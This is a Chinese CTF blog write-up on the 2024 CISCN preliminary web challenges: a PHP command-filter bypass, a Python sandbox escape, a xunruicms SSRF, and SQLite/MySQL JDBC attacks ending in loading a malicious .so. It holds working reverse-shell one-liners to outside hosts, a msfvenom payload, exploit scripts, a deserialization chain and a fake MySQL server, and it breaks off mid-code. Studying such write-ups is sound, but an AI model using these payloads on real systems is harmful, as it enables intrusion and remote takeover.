---
title: "2024CISCN 初赛WEB WP"
onlyTitle: true
date: 2024-12-22 17:51:21
categories:
- ctf
- WP
tags:
- CTF
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8126.png
---



# 2024CISCN

总览：

| simple_php | php RCE                                                      |
| ---------- | ------------------------------------------------------------ |
| mossfern   | python栈帧逃逸                                               |
| easycms    | 审CMS 1day SSRF                                              |
| ez_java    | 3种解法：<br />1. sqlite jdbc attack写缓存文件，create view劫持select，进而load_extension加载so<br />2. sqlite jdbc attack写缓存文件，sql注入load_extension加载so<br />3. mysql jdbc attack打AJ链写so文件，搭配1或2中的create view or sql注入加载so |
| Sanic      | 1. 审sanic源码 八进制绕过cookie过滤<br />2. 审pydash源码 `_\\\\.`绕过`_.`过滤<br />3. pydash `set_()`原型链污染读文件<br />4. 污染app.static() directory_view、directory列目录 |



## simple_php

源码：

```php
ini_set('open_basedir', '/var/www/html/');
error_reporting(0);

if(isset($_POST['cmd'])){
    $cmd = escapeshellcmd($_POST['cmd']); 
     if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
         system($cmd);
}
}


show_source(__FILE__);
?>
```

escapeshellcmd将所有和命令执行的函数都进行了转义

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/66b5e94c8b538.png)

用php -r 执行单行代码

由于引号被过滤，用`hex2bin(16进制)`可以把16进制数据转为字符串进行绕过

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211204310440.png)

即：

```shell
php -r eval(hex2bin(62617368202d69203e26202f6465762f7463702f39373331707a3935686d39322e766963702e66756e2f323033303320303e2631))
```

但是由于没用引号，以数字开头php会以为是个纯数字，遇到字母报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211204411944.png)

用substr截一下，返回的是字符串类型而不是我们传进去它自动识别的类型

```shell
cmd=php -r $a=substr(Z6e63203132312e34302e3139352e3139342032333333202d65202f62696e2f7368,1);system(hex2bin($a));
```

ctfshow bash和nc都弹不了，好像不出网的鸭子，按理说标准流程是ps查看进程后登录mysql就能读flag

算了，换个方式吧

可以用diff读目录，dd读文件：

```shell
diff / /home
```

会对根目录 `/` 和 `/home` 目录的内容进行比较。`diff --recursive` 会逐文件和目录地比较两路径的内容，输出差异信息。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211212155856.png)

根目录没有flag，读passwd：

```sh
dd if=/etc/passwd
```

`dd` 会将输入数据复制到标准输出（`stdout`），如果没有指定输出文件（`of`），数据会直接显示在终端。

/proc/self/environ也读不了

/etc/passwd看到有mysql，弱密码登mysql得到flag：

```sh
cmd=mysqldump -uroot -proot --all-databases
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211213646240.png)

还是ichunqiu靶机好一点，能打bash



## mossfern

在线执行代码？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241214171206575.png)

附件给了两个源码，同理我把注释贴代码里方便阅读

main.py：

```python
import os
import subprocess
from flask import Flask, request, jsonify
from uuid import uuid1

app = Flask(__name__)

runner = open("/app/runner.py", "r", encoding="UTF-8").read()
flag = open("/flag", "r", encoding="UTF-8").readline().strip()


@app.post("/run")
def run():
    id = str(uuid1())#为每次请求生成一个唯一 ID，用于文件命名，防止文件名冲突。
    try:
        data = request.json
        open(f"/app/uploads/{id}.py", "w", encoding="UTF-8").write(
            runner.replace("THIS_IS_SEED", flag).replace("THIS_IS_TASK_RANDOM_ID", id))
        open(f"/app/uploads/{id}.txt", "w", encoding="UTF-8").write(data.get("code", ""))#创建两个文件：{id}.py：基于 runner.py 模板动态生成，用于执行任务，替换了占位符 THIS_IS_SEED 和 THIS_IS_TASK_RANDOM_ID；{id}.txt：保存用户提交的代码片段。
        run = subprocess.run(
            ['python', f"/app/uploads/{id}.py"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3
        )#执行生成的 Python 脚本
        result = run.stdout.decode("utf-8")
        error = run.stderr.decode("utf-8")#标准输出和标准错误输出捕获到 result 和 error 中
        print(result, error)


        if os.path.exists(f"/app/uploads/{id}.py"):
            os.remove(f"/app/uploads/{id}.py")
        if os.path.exists(f"/app/uploads/{id}.txt"):
            os.remove(f"/app/uploads/{id}.txt")#删除动态生成的文件
        return jsonify({
            "result": f"{result}\n{error}"
        })
    except:
        if os.path.exists(f"/app/uploads/{id}.py"):
            os.remove(f"/app/uploads/{id}.py")
        if os.path.exists(f"/app/uploads/{id}.txt"):
            os.remove(f"/app/uploads/{id}.txt")
        return jsonify({
            "result": "None"
        })


if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

runner.py：

```python
#检查源码是否包含危险字符串。禁止非 ASCII 字符。
def source_simple_check(source):

    """
    Check the source with pure string in string, prevent dangerous strings
    :param source: source code
    :return: None
    """

    from sys import exit
    from builtins import print

    try:
        source.encode("ascii")
    except UnicodeEncodeError:
        print("non-ascii is not permitted")
        exit()

    for i in ["__", "getattr", "exit"]:
        if i in source.lower():
            print(i)
            exit()

#过滤函数
def block_wrapper():
    """
    Check the run process with sys.audithook, no dangerous operations should be conduct
    :return: None
    """

    def audit(event, args):

        from builtins import str, print
        import os

        for i in ["marshal", "__new__", "process", "os", "sys", "interpreter", "cpython", "open", "compile", "gc"]:
            if i in (event + "".join(str(s) for s in args)).lower():
                print(i)
                os._exit(1)
    return audit

#检查源码的字节码，确保没有加载全局变量 (LOAD_GLOBAL)、导入模块 (IMPORT_NAME) 或加载方法 (LOAD_METHOD) 的操作。
#如果发现这些操作且不属于白名单（randint、randrange、print、seed），则退出程序。
def source_opcode_checker(code):
    """
    Check the source in the bytecode aspect, no methods and globals should be load
    :param code: source code
    :return: None
    """

    from dis import dis
    from builtins import str
    from io import StringIO
    from sys import exit

    opcodeIO = StringIO()
    dis(code, file=opcodeIO)#通过 dis 模块生成源码的字节码，并将其逐行存储
    opcode = opcodeIO.getvalue().split("\n")
    opcodeIO.close()
    for line in opcode:
        if any(x in str(line) for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"]):
            if any(x in str(line) for x in ["randint", "randrange", "print", "seed"]):
                break
            print("".join([x for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"] if x in str(line)]))
            exit()


if __name__ == "__main__":

    from builtins import open
    from sys import addaudithook
    from contextlib import redirect_stdout
    from random import randint, randrange, seed
    from io import StringIO
    from random import seed
    from time import time

    source = open(f"/app/uploads/THIS_IS_TASK_RANDOM_ID.txt", "r").read()
    source_simple_check(source)
    source_opcode_checker(source)
    code = compile(source, "<sandbox>", "exec")
    addaudithook(block_wrapper())
    outputIO = StringIO()
    with redirect_stdout(outputIO):
        seed(str(time()) + "THIS_IS_SEED" + str(time()))
        exec(code, {
            "__builtins__": None,
            "randint": randint,
            "randrange": randrange,
            "seed": seed,
            "print": print
        }, None)#定义了一个受限执行环境（__builtins__ 被设置为 None，仅暴露少量白名单函数）；
    output = outputIO.getvalue()

    if "THIS_IS_SEED" in output:
        print("这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！")
        print("bad code-operation why still happened ah?")
    else:
        print(output)

```

代码流程也很简单：

1. 把runner.py的占位符THIS_IS_SEED换为flag，THIS_IS_TASK_RANDOM_ID换为id，保存为`{id}.py`。
2. run路由接收json参数，key=code对应的value作为代码保存到`{id}.txt`，然后用`{id}.py`去运行`{id}.txt`



flag在runner.py里就是`THIS_IS_SEED`替换的字符串，虽然flag是主进程定义的变量，沙箱逃逸不能从子进程越到主进程；但是经过替换已经导入到了runner.py进程

然后思考一下需要f_back多少层，画个栈图如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219165727451.png)

所以三层能退回主函数

怎么获取已定义的flag变量？

在 Python 中，**`co_consts`** 是编译后代码对象（`code object`）的一个属性。它包含了 **字节码中定义的所有常量**。

最后如果flag在输出里，会直接被过滤

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219170305797.png)

用print的end参数，逗号分割就完了

脚本如下：

```python
import requests

url = 'http://8e890316-d92c-4777-88d8-0cc1bddb35a3.challenge.ctf.show/run'
data = {
    "code": '''
def exp():
    def scq():
        yield scq.gi_frame.f_back
    scq = scq()
    frame = [x for x in scq][0]
    gattr = frame.f_back.f_back.f_back.f_globals['_'+'_builtins_'+'_']# jail
    s = gattr.str
    for i in s(frame.f_back.f_back.f_back.f_code.co_consts):
        print(i, end = ",")
exp()
'''
}

response = requests.post(url, json=data)
print(response.json())
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241215213822847.png)

本地不知道什么原因一样的payload跑不出



## easycms

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219173210416.png)

要求从127.0.0.1访问，结合cms提示，应该是审源码的ssrf

点进去主页如下，xunruicms

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219174238869.png)

官方存在漏洞公示

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220141423405.png)

https://www.xunruicms.com/bug/

直接看下有没有ssrf，找到一个qrcode的ssrf

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220142314298.png)

<=4.5.6，但是github还是4.3.13版本。下下来分析一下

ssrf常见的php敏感函数：

```php
file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()
```

根据题目提示，锁定到Api类的qrcode函数，存在两处使用file_get_contents

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220143350986.png)

尽管`$QR`在`caching/qrcode-`后拼了一堆md5，无法控制。但是`$thumb`接收get传参后直接带入了file_get_contents

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220143630328.png)

这个网站给出了xunrui cms qrcode的使用方法

https://www.zhimatong.com/jiaocheng/779.html

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220150132461.png)

官方文档给出了调用程序路由的格式

https://help.xunruicms.com/547.html

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220150615680.png)

api/qrcode就是`?s=api&m=qrcode&c=api`

弹个shell：

```http
/index.php?s=api&m=qrcode&c=api&text=1&thumb=http://127.0.0.1/flag.php?cmd=system('nc vps 20303 -e /bin/sh');
```

打的时候网页就直接卡死了，不懂，换bash也弹不出来，直接给打了个504

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220152843189.png)

这里主要是学习wp的手法，在过滤了127.0.0.1的情况下打302跳转

本地开个http服务重新Location到127.0.0.1

```php
<?php
    header("Location:http://127.0.0.1/flag.php?cmd=php%20%2Dr%20%27%24sock%3Dfsockopen%28%22ip%22%2Cport%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27",true,302);
    exit();
    ?>
```

也打不通，算了

## ez_java

源码看pom.xml，有mysql 8.0.13，postgresql 42.7.2，sqlite 3.8.9，aspectjweaver 1.9.5

与大多数其他 SQL 数据库不同，SQLite 没有单独的服务器进程。SQLite 直接读取和写入普通磁盘文件。一个完整的 SQL 数据库（包含多个表、索引、触发器和视图）包含在单个磁盘文件中。

3.6.14.1-3.41.2.1为漏洞版本，3.41.2.2为安全版本

```xml
<dependency>
    <groupId>org.xerial</groupId>
    <artifactId>sqlite-jdbc</artifactId>
    <version>3.8.9</version>
</dependency>
```



### SQLite JDBC Attack

这个数据库出现的很少，但ctf就喜欢考少见的东西。由于24ciscn涉及就来复现一下

JDBC中，sqlite参数相当于执行对应的PRAGMA的SQL语句，比如下面两句等价

```sql
jdbc:sqlite:file:default.db?cache_size=2000
PRAGMA cache_size = 2000
```

sqlite官网列出了PRAGMAs

https://www.sqlite.org/pragma.html

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220204530154.png)

可以理解成sqlite的api

`org.sqlite.SQLiteConfig.apply()`处，给出了从jdbc参数转化为PRAGMA语句的代码，把参数对应的(key,value)转变为`pragma key=value`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220211000864.png)

除了这些PRAGMA，在SQLiteConfig定义的枚举变量还有一些不在上图的others语句，也就是下面注释的`// Parameters requiring SQLite3 API invocation`和`// Others`

```java
public static enum Pragma {

    // Parameters requiring SQLite3 API invocation
    OPEN_MODE("open_mode", "Database open-mode flag", null),
    SHARED_CACHE("shared_cache", "Enable SQLite Shared-Cache mode, native driver only", OnOff),
    LOAD_EXTENSION("enable_load_extension", "Enable SQLite load_extention() function, native driver only", OnOff),

    // Pragmas that can be set after opening the database
    CACHE_SIZE("cache_size"),
    CASE_SENSITIVE_LIKE("case_sensitive_like", OnOff),
    COUNT_CHANGES("count_changes", OnOff),
    DEFAULT_CACHE_SIZE("default_cache_size"),
    EMPTY_RESULT_CALLBACKS("empty_result_callback", OnOff),
    ENCODING("encoding", toStringArray(Encoding.values())),
    FOREIGN_KEYS("foreign_keys", OnOff),
    FULL_COLUMN_NAMES("full_column_names", OnOff),
    FULL_SYNC("fullsync", OnOff),
    INCREMENTAL_VACUUM("incremental_vacuum"),
    JOURNAL_MODE("journal_mode", toStringArray(JournalMode.values())),
    JOURNAL_SIZE_LIMIT("journal_size_limit"),
    LEGACY_FILE_FORMAT("legacy_file_format", OnOff),
    LOCKING_MODE("locking_mode", toStringArray(LockingMode.values())),
    PAGE_SIZE("page_size"),
    MAX_PAGE_COUNT("max_page_count"),
    READ_UNCOMMITED("read_uncommited", OnOff),
    RECURSIVE_TRIGGERS("recursive_triggers", OnOff),
    REVERSE_UNORDERED_SELECTS("reverse_unordered_selects", OnOff),
    SHORT_COLUMN_NAMES("short_column_names", OnOff),
    SYNCHRONOUS("synchronous", toStringArray(SynchronousMode.values())),
    TEMP_STORE("temp_store", toStringArray(TempStore.values())),
    TEMP_STORE_DIRECTORY("temp_store_directory"),
    USER_VERSION("user_version"),

    // Others
    TRANSACTION_MODE("transaction_mode", toStringArray(TransactionMode.values())),
    DATE_PRECISION("date_precision", "\"seconds\": Read and store integer dates as seconds from the Unix Epoch (SQLite standard).\n\"milliseconds\": (DEFAULT) Read and store integer dates as milliseconds from the Unix Epoch (Java standard).", toStringArray(DatePrecision.values())),
    DATE_CLASS("date_class", "\"integer\": (Default) store dates as number of seconds or milliseconds from the Unix Epoch\n\"text\": store dates as a string of text\n\"real\": store dates as Julian Dates", toStringArray(DateClass.values())),
    DATE_STRING_FORMAT("date_string_format", "Format to store and retrieve dates stored as text. Defaults to \"yyyy-MM-dd HH:mm:ss.SSS\"", null),
    BUSY_TIMEOUT("busy_timeout", null);

    public final String   pragmaName;
    public final String[] choices;
    public final String   description;

    private Pragma(String pragmaName) {
        this(pragmaName, null);
    }

    private Pragma(String pragmaName, String[] choices) {
        this(pragmaName, null, choices);
    }

    private Pragma(String pragmaName, String description, String[] choices) {
        this.pragmaName = pragmaName;
        this.description = description;
        this.choices = choices;
    }

    public final String getPragmaName()
    {
        return pragmaName;
    }
}
```

上面唯一能利用的参数，是load_extension()，可以用来加载动态链接库



锁定到sqlite-jdbc 2023 May19的一条Commit

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220213331722.png)

先看代码，只是把resourceAddr.hashCode换成了UUID.randomUUID。让远程加载数据库文件的缓存文件变得不可预测

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220213533629.png)

这条Commit下面的Comment也很有意思，说这版代码用着会持续不断地创建sqlite-jdbc-tep-%s.db，会损耗磁盘空间，而生成的db缓存文件在程序结束不会被删除。问能不能还原该commit

原来的缓存文件用hashCode后缀，而众所周知hashCode是单向函数，而不是随机函数，该文件命名攻击者可以预测出来

当sqlite建立连接时调用`org.sqlite.core.CoreConnection#open`

如果文件名不以`:memory`或`file:`开头，或不包含`mode=memory`，则进入第二个if；如果文件名以`resource:`开头，则把文件名转为URL，调用extractResource去远程加载

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220220125863.png)

比如`jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db`就能远程加载db文件

跟进到extractResource看看怎么加载的，获取了系统的tmp目录，然后文件名为`sqlite-jdbc-tmp-%d.db`带入` resourceAddr.hashCode()`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221170430563.png)

接着从resourceAddr获取文件内容写进了上面的db文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221170738225.png)

只是写文件似乎还不够，有没有办法达到RCE呢

我们想到上面提到的load_extension()加载动态链接库。

除了JDBC URL可控制，假设还有下列代码：

sql语句固定了为`"select * from student"`

```java
package org.example;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

public class Main {
    public static void main(String[] args) {
        try {
            String sql = "select * from student";
            PreparedStatement preStmt = conn.prepareStatement(sql);
            preStmt.executeUpdate();
            preStmt.close();
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

可以使用`SELECT load_extension('/tmp/...so')`加载dll/so文件。

但是上述代码为`select * from student`，根本无法写成select load_extension，该如何修改？

利用`create view` 语句，可以劫持SELECT语句，如下

```sqlite
create view y4tacker as SELECT (select load_extension('/tmp/....so'))
```

正巧，在open方法内，extractResource之后就执行了NativeDB.open去加载db文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221180411860.png)

执行create view语句后，再执行固定的select就会被劫持成执行`select load_extension('/tmp/....so')`



于是我们的攻击流程如下：

* 利用JDBC Attack写恶意so文件，可以是自己编译的弹shell，也可以是msfvenom
* 继续利用JDBC Attack写create view的db文件，写完后会被自动加载

```sqlite
CREATE VIEW test(a) as select load_extension('calc.dll','dllmain')
```

在调用select时触发恶意so

上述利用需要开启了enable_load_extension，如果没开，也可以通过PRAGMA开启：

```
jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-hashcode.db?enable_load_extension=true
```



### 2024ez_java题解

给了源代码，springboot起的，有两种打法

* 直接打sqlite JDBC写缓存，然后sqlite加载so

* mysql JDBC打AJ写so文件，sqlite加载so

理论上已知JAVA HOME的话，还能打Springboot FatJar RCE



先看下依赖，给了sqlite,mysql,postgresql的JDBC依赖，还有aspectjweaver

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195230733.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195242663.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195248562.png)

可惜没给spring-expression依赖，不然能打postgreSQL的SpEL注入

审代码，看到JdbcController，调用了DatasourceServiceImpl.testDatasourceConnectionAble

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195842587.png)

testDatasourceConnectionAble里分别给出了三个JDBC的case，其中case3就是调用SqliteDatasourceConnector进行连接，继续跟进

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200008209.png)

环境先开启了enableLoadExtension，然后调用getConnection

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200127396.png)

这就是个JDBC Attack的点，可以用来写文件到/tmp下

继续看到getTableContent，调用了select

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200407450.png)

case里，connector之后就调用了getTableContent

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200508187.png)

#### 题解1：sqlite写缓存题解

jdbc Attack + 写create view劫持select

现在先制作一个so，懒得编译C了，直接msf吧

把反弹shell base一下

```shell
bash -c "bash -i >& /dev/tcp/vpsip/20303 0>&1"
```

```sh
msfvenom -p linux/x64/exec CMD='echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuMjM2LjE1My4xNzQvMjAzMDMgMD4mMSI=|base64 -d|bash' -f elf-so -o evil.so
```

开个http服务挂evil.so

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221202529840.png)

写两行代码看下写进去的so文件名

```java
import java.net.URL;

public class test {
    public static void main(String[] args) throws Exception{
        String url = "http://vps:port/evil.so";
        Integer hash = new URL(url).hashCode();
        String dbFileName = String.format("sqlite-jdbc-tmp-%d.db", Integer.valueOf(hash));
        System.out.println(dbFileName);
    }
}
```

我的是`sqlite-jdbc-tmp-882872429.db`

再生成一个恶意db去触发上面传的db，生成恶意db的代码如下：

```java
import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

public class Main {
    public static void main(String[] args) {
        try {
            String dbFile = "poc.db";
            File file = new File(dbFile);
            Class.forName("org.sqlite.JDBC");
            Connection conn = DriverManager.getConnection("jdbc:sqlite:"+dbFile);
            System.out.println("Opened database successfully");
            String sql = "CREATE VIEW security as SELECT (SELECT load_extension('/tmp/sqlite-jdbc-tmp-882910002.db'));";  //向其中插⼊传⼊的三个参数
            PreparedStatement preStmt = conn.prepareStatement(sql);
            preStmt.executeUpdate();
            preStmt.close();
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

poc.db二进制：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153642993.png)

继续上传恶意poc.db，代码会自动执行：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221204750389.png)

MD，向日葵普通版不支持http，只能tcp，半天没打进，鼠鼠这次是真要买个vps了

重金之下，终于弹回了shell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221210850016.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221210934151.png)

如果没开enable_load_extension，也可以直接开，题目是代码开了

```
jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-hashcode.db?enable_load_extension=true
```

select的触发，是传tableName参数，完成了`select * from security`触发视图

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221212758961.png)

#### 题解2：无create裸打

需要题目场景存在select语句可控制

题解1不是搞了个create view的db去打的吗，其实还有更优雅的方法，因为sql语句可控制内容很大，写evil.so到/tmp下后，post下面这个数据包，能直接弹回shell

```json
{"type":"3",
 "tableName":"(select (load_extension(\"/tmp/sqlite-jdbc-tmp-882872429.db\")));",
 "url":"jdbc:sqlite:file:/tmp/any.db"}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153108045.png)

随便传一个jdbc url串，让代码能够顺利走到getTableContent

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153459969.png)

上面的payload是触发了`select * from (select (load_extension(\"/tmp/sqlite-jdbc-tmp-882872429.db\"))`



#### 题解3：mysql搭配aspectAJweaver写文件

题目有mysql jdbc依赖，case1也进行了mysql的getConnection

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221220149687.png)

但是我们之前学到的是mysql打CC，其实最后触发点为readObject，反序列化链都能打

AJ链：

https://godownio.github.io/2024/12/19/aspectjweaver-fan-xu-lie-hua/

Mysql JDBC：

https://godownio.github.io/2024/12/01/jdbc-attack/

AJ链的构造需要找一个map.put的点，在UserBean下找到了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222154931589.png)

AJ链写evil.so，payload如下：

```java
import com.example.jdbctest.bean.UserBean;

import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class AJ_writeso {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\src\\main\\java\\com\\example\\jdbctest\\bean\\evil.so"));
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class);
        constructor.setAccessible(true);
        HashMap storeableCachingMap = (HashMap) constructor.newInstance("./",1);
//        storeableCachingMap.put("writeToPathFILE",code);
        String age = Base64.getEncoder().encodeToString(code);
        UserBean userBean = new UserBean("../../../../../../../../../../../../tmp/evil.so",age);
        userBean.setObj(storeableCachingMap);
        serialize(userBean);
//        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws Exception, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

文件路径要记着

通过Mysql JDBC打AJ，代码如下：

```java
package org.exploit.JDBC;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class MySQL_Attack_server {
    private static final String GREETING_DATA = "4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400";
    private static final String RESPONSE_OK_DATA = "0700000200000002000000";
    private static final String PAYLOAD_FILE = "ser.bin";

    public static void main(String[] args) {
        String host = "0.0.0.0";
        int port = 19999;

        try (ServerSocket serverSocket = new ServerSocket(port, 50, InetAddress.getByName(host))) {
            System.out.println("Start fake MySQL server listening on " + host + ":" + port);

            while (true) {
                try (Socket clientSocket = serverSocket.accept()) {
                    System.out.println("Connection come from " + clientSocket.getInetAddress() + ":" + clientSocket.getPort());

                    // Send greeting data
                    sendData(clientSocket, GREETING_DATA);

                    while (true) {
                        // Login simulation: Client sends request login, server responds with OK
                        receiveData(clientSocket);
                        sendData(clientSocket, RESPONSE_OK_DATA);

                        // Other processes
                        String data = receiveData(clientSocket);
                        if (data.contains("session.auto_increment_increment")) {
                            String payload = "01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000";
                            sendData(clientSocket, payload);
                            data = receiveData(clientSocket);
                        } else if (data.contains("SHOW WARNINGS")) {
                            String payload = "01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000";
                            sendData(clientSocket, payload);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SET NAMES")) {
                            sendData(clientSocket, RESPONSE_OK_DATA);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SET character_set_results")) {
                            sendData(clientSocket, RESPONSE_OK_DATA);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SHOW SESSION STATUS")) {
                            StringBuilder mysqlDatafinal = new StringBuilder();
                            String mysqlData = "0100000102";
                            mysqlData += "1a000002036465660001630163016301630c3f00ffff0000fc9000000000";
                            mysqlData += "1a000003036465660001630163016301630c3f00ffff0000fc9000000000";

                            // Get payload
                            String payloadContent = getPayloadContent();
                            if (payloadContent != null) {
                                // 计算 payload 长度并转为十六进制格式
                                String payloadLength = Integer.toHexString(payloadContent.length() / 2); // Python中的 //2 在Java中是使用除法
